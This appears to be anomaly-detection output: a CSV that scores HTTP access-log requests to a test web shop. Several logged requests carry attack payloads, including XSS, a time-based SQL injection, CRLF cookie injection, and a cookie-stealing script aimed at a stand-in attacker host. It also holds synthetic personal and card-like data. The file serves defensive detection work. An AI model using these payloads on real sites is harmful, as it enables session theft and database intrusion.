score_content,score_session,score_fused,score_fused_norm,line
0.5229076743125916,0.8892000913619995,0.7060538828372955,0.7060538828372955,localhost:8080 - - [10/Jan/2025:15:57:15 +0000] "GET http://localhost:8080/CFIDE/administrator/enter.cfm HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
77.39642333984375,0.9519331455230713,39.17417824268341,39.17417824268341,localhost:8080 - - [10/Jan/2025:15:57:15 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=myrtie&password=9uBIleTE&nombre=Aelohim&apellidos=Coria+Echecopar&email=bonnafe%40prensahp.mn&dni=12879968Z&direccion=C%2F+Vivers+102+&ciudad=Moralina&cp=24288&provincia=Cue%2Fnc..a&ntc=0201643055570272&B1=Registrar HTTP/1.1 HTTP/1.1" 200 882 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.9517474174499512,1.9934015274047852,1.9934015274047852,localhost:8080 - - [10/Jan/2025:15:57:15 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
75.68914794921875,1.024860143661499,38.357004046440125,38.357004046440125,localhost:8080 - - [10/Jan/2025:15:57:15 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=myrtie&password=9uBIleTE&nombre=Aelohim&apellidos=Coria+Echecopar&email=bonnafe%40prensahp.mn&dni=12879968Z&direccion=C%2F+Vivers+102+&ciudadA=Moralina&cp=24288&provincia=Madrid&ntc=0201643055570272&B1=Registrar HTTP/1.1 HTTP/1.1" 200 870 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,1.0245281457901,2.0297918915748596,2.0297918915748596,localhost:8080 - - [10/Jan/2025:15:57:16 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.8139696717262268,1.0082569122314453,0.9111132919788361,0.9111132919788361,localhost:8080 - - [10/Jan/2025:15:57:16 +0000] "GET http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 201 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5229076743125916,0.9898697137832642,0.7563886940479279,0.7563886940479279,localhost:8080 - - [10/Jan/2025:15:57:16 +0000] "GET http://localhost:8080/e2ePortalProject/Login.portal HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
48.36970138549805,0.8846604824066162,24.62718093395233,24.62718093395233,localhost:8080 - - [10/Jan/2025:15:57:16 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=64&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.8849148750305176,1.9443084001541138,1.9443084001541138,localhost:8080 - - [10/Jan/2025:15:57:17 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.7983341217041,0.8099283576011658,15.304131239652634,15.304131239652634,localhost:8080 - - [10/Jan/2025:15:57:17 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Queso+Manchego&precio=39&cantidad=64&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.810113787651062,1.906907856464386,1.906907856464386,localhost:8080 - - [10/Jan/2025:15:57:17 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.48676872253418,0.7331064939498901,15.109937608242035,15.109937608242035,localhost:8080 - - [10/Jan/2025:15:57:17 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precioA=39&cantidad=64&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.733233630657196,1.868467777967453,1.868467777967453,localhost:8080 - - [10/Jan/2025:15:57:18 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.333515167236328,0.7537225484848022,15.043618857860565,15.043618857860565,localhost:8080 - - [10/Jan/2025:15:57:18 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=DEs9I852d268%253F&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 387 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.7562368512153625,1.9477947056293488,1.9477947056293488,localhost:8080 - - [10/Jan/2025:15:57:18 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.883872985839844,0.757748544216156,14.820810765028,14.820810765028,localhost:8080 - - [10/Jan/2025:15:57:18 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=DEs9I852d268&remember=on%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.7745292782783508,1.956940919160843,1.956940919160843,localhost:8080 - - [10/Jan/2025:15:57:19 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.73736572265625,0.6614465117454529,14.699406117200851,14.699406117200851,localhost:8080 - - [10/Jan/2025:15:57:19 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=DEs9I852d268&rememberA=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.5445802807807922,1.8419664204120636,1.8419664204120636,localhost:8080 - - [10/Jan/2025:15:57:19 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.388172149658203,0.5608139634132385,11.97449305653572,11.97449305653572,localhost:8080 - - [10/Jan/2025:15:57:19 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.5786397457122803,1.9629424810409546,1.9629424810409546,localhost:8080 - - [10/Jan/2025:15:57:20 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.3557944297790527,0.48583081364631653,1.4208126217126846,1.4208126217126846,localhost:8080 - - [10/Jan/2025:15:57:20 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp/6909030637832563290.jsp HTTP/1.1 HTTP/1.1" 200 270 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.291543006896973,1.904935359954834,6.598239183425903,6.598239183425903,localhost:9090 - - [10/Jan/2025:15:57:20 +0000] "PUT http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.849061965942383,0.4835287034511566,12.66629533469677,12.66629533469677,localhost:8080 - - [10/Jan/2025:15:57:20 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.4122008681297302,1.70795139670372,1.70795139670372,localhost:8080 - - [10/Jan/2025:15:57:21 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.248547077178955,0.3931145966053009,0.820830836892128,0.820830836892128,localhost:8080 - - [10/Jan/2025:15:57:21 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.Inc HTTP/1.1 HTTP/1.1" 200 225 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.94103240966797,0.4106988310813904,13.17586562037468,13.17586562037468,localhost:8080 - - [10/Jan/2025:15:57:21 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2408&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.429378867149353,1.7017186284065247,1.7017186284065247,localhost:8080 - - [10/Jan/2025:15:57:21 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.7272891998291,0.39704596996307373,13.062167584896088,13.062167584896088,localhost:8080 - - [10/Jan/2025:15:57:22 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2408&B1A=Pasar+por+caja HTTP/1.1 HTTP/1.1" 200 303 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.39729660749435425,1.6856774985790253,1.6856774985790253,localhost:8080 - - [10/Jan/2025:15:57:22 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
87.26776885986328,0.4825694262981415,43.87516914308071,43.87516914308071,localhost:8080 - - [10/Jan/2025:15:57:22 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yokono5&password=8e6d77ador9&nombre=Vince%2Bnt&apellidos=Gochez&email=mott%40hostprofessional.ma&dni=17879103F&direccion=Calle+Nu%F1ez+De+Guzman+24%2C+&ciudad=Carcedo+de+Bureba&cp=50217&provincia=Murcia&ntc=2770286636013280&B1=Registrar HTTP/1.1 HTTP/1.1" 200 948 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.4821292757987976,1.775122970342636,1.775122970342636,localhost:8080 - - [10/Jan/2025:15:57:22 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
86.8013916015625,0.5671408772468567,43.68426623940468,43.68426623940468,localhost:8080 - - [10/Jan/2025:15:57:23 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yokono5&password=8e6d77ador9&nombre=Gisberto&apellidos=Gochez&email=mott%40hostprofessional.ma&dni=17879103F&direccion=Calle+Nu%F1ez+De+Guzman+24%2C+&ciudad=Carcedo+de+Bureba&cp=50217&provincia=Murcia&ntcA=2770286636013280&B1=Registrar HTTP/1.1 HTTP/1.1" 200 945 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.5665456652641296,1.8173311650753021,1.8173311650753021,localhost:8080 - - [10/Jan/2025:15:57:23 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
58.33924865722656,0.6091815829277039,29.474215120077133,29.474215120077133,localhost:8080 - - [10/Jan/2025:15:57:23 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.60923171043396,1.806466817855835,1.806466817855835,localhost:8080 - - [10/Jan/2025:15:57:23 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.626134872436523,0.6038827300071716,12.115008801221848,12.115008801221848,localhost:8080 - - [10/Jan/2025:15:57:24 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.6041248440742493,1.8039133846759796,1.8039133846759796,localhost:8080 - - [10/Jan/2025:15:57:24 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5593808889389038,0.5833149552345276,0.5713479220867157,0.5713479220867157,localhost:8080 - - [10/Jan/2025:15:57:24 +0000] "GET http://localhost:8080/tienda1/global/estilos.css.INC HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5229076743125916,0.5649728775024414,0.5439402759075165,0.5439402759075165,localhost:8080 - - [10/Jan/2025:15:57:24 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes.old HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.8671696186065674,0.549246609210968,1.2082081139087677,1.2082081139087677,localhost:8080 - - [10/Jan/2025:15:57:25 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 252 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.32288932800293,1.9048389196395874,6.6138641238212585,6.6138641238212585,localhost:9090 - - [10/Jan/2025:15:57:25 +0000] "PUT http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
85.87369537353516,0.6367117166519165,43.255203545093536,43.255203545093536,localhost:8080 - - [10/Jan/2025:15:57:25 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ofilia&password=santurr%F3n&nombre=Lauran&apellidos=Tonk+Carrizales&email=engel%40longboarders.cu&dni=17B088362Y&direccion=Plza.+Juan+Zorrilla%2C+107+9%3FF&ciudad=Bruc%2C+El&cp=28522&provincia=Granada&ntc=1816581279872417&B1=Registrar HTTP/1.1 HTTP/1.1" 200 939 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.6548344492912292,1.8449450433254242,1.8449450433254242,localhost:8080 - - [10/Jan/2025:15:57:25 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
85.87369537353516,0.7442757487297058,43.30898556113243,43.30898556113243,localhost:8080 - - [10/Jan/2025:15:57:26 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ofilia&password=santurr%F3n&nombre=Lauran&apellidosA=Tonk+Carrizales&email=engel%40longboarders.cu&dni=03303370H&direccion=Plza.+Juan+Zorrilla%2C+107+9%3FF&ciudad=Bruc%2C+El&cp=28522&provincia=Granada&ntc=1816581279872417&B1=Registrar HTTP/1.1 HTTP/1.1" 200 939 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.7438297867774963,1.8894427120685577,1.8894427120685577,localhost:8080 - - [10/Jan/2025:15:57:26 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2714911699295044,0.7454326748847961,0.5084619224071503,0.5084619224071503,localhost:8080 - - [10/Jan/2025:15:57:26 +0000] "GET http://localhost:8080/tienda1/miembros.OLD HTTP/1.1 HTTP/1.1" 200 153 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.1882877349853516,0.7277476787567139,0.9580177068710327,0.9580177068710327,localhost:8080 - - [10/Jan/2025:15:57:26 +0000] "GET http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.Old HTTP/1.1 HTTP/1.1" 200 222 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.8623508214950562,0.7085694074630737,0.7854601144790649,0.7854601144790649,localhost:8080 - - [10/Jan/2025:15:57:27 +0000] "GET http://localhost:8080/tienda1/index.jsp/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 204 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.1646314412355423,0.6948674321174622,0.42974943667650223,0.42974943667650223,localhost:8080 - - [10/Jan/2025:15:57:27 +0000] "GET http://localhost:8080/tienda1/.Bak HTTP/1.1 HTTP/1.1" 200 129 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
46.91322326660156,0.7235909104347229,23.818407088518143,23.818407088518143,localhost:8080 - - [10/Jan/2025:15:57:27 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=77%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 627 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.6344998478889465,1.8191008865833282,1.8191008865833282,localhost:8080 - - [10/Jan/2025:15:57:27 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.181947708129883,0.6377946734428406,14.909871190786362,14.909871190786362,localhost:8080 - - [10/Jan/2025:15:57:28 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=77&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 384 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.5493651032447815,1.7765335142612457,1.7765335142612457,localhost:8080 - - [10/Jan/2025:15:57:28 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
54.9465217590332,0.5900394916534424,27.768280625343323,27.768280625343323,localhost:8080 - - [10/Jan/2025:15:57:28 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=frants&pwd=c222Lib6T912&remember=on&B1=Entrarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2 HTTP/1.1 HTTP/1.1" 200 705 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.5439567565917969,1.841654658317566,1.841654658317566,localhost:8080 - - [10/Jan/2025:15:57:28 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.032068252563477,0.5466120839118958,14.789340168237686,14.789340168237686,localhost:8080 - - [10/Jan/2025:15:57:29 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=frants&pwd=clor%2F%EDTIca&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 381 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.5495243668556213,1.8444384634494781,1.8444384634494781,localhost:8080 - - [10/Jan/2025:15:57:29 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.883872985839844,0.5522888898849487,14.718080937862396,14.718080937862396,localhost:8080 - - [10/Jan/2025:15:57:29 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=frants&pwdA=c222Lib6T912&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.5705176591873169,1.854935109615326,1.854935109615326,localhost:8080 - - [10/Jan/2025:15:57:29 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2521088719367981,0.5719289183616638,0.41201889514923096,0.41201889514923096,localhost:8080 - - [10/Jan/2025:15:57:30 +0000] "GET http://localhost:8080/tienda1/publico.Old HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
30.60675048828125,0.5956942439079285,15.60122236609459,15.60122236609459,localhost:8080 - - [10/Jan/2025:15:57:30 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1 HTTP/1.1" 200 411 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.5081477165222168,1.9276964664459229,1.9276964664459229,localhost:8080 - - [10/Jan/2025:15:57:30 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.883872985839844,0.5107129216194153,14.69729295372963,14.69729295372963,localhost:8080 - - [10/Jan/2025:15:57:30 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.4232141077518463,1.8852296620607376,1.8852296620607376,localhost:8080 - - [10/Jan/2025:15:57:31 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.388172149658203,0.4203439950942993,11.904258072376251,11.904258072376251,localhost:8080 - - [10/Jan/2025:15:57:31 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
